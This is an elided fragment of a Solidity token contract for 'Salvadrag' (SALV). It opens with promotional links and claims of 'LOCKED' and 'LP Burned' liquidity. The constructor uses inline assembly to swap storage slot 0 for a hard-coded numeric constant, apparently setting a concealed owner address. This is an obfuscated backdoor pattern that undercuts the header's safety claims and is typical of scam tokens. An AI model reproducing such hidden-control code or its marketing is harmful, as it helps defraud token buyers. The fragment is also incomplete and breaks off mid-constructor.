/*
Welcome to Salvadrag

Telegram: https://t.me/Salvadrag
Twitter: https://twitter.com/Salvadrag
https://Salvadrag.space
LOCKED
LP Burned
Always DYOR
MoonGem
...
contract Salvadrag {
    string public constant name = "Salvadrag";
    string public constant symbol = "SALV";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1026966398745683883768954379842079878094022753122, 1))}
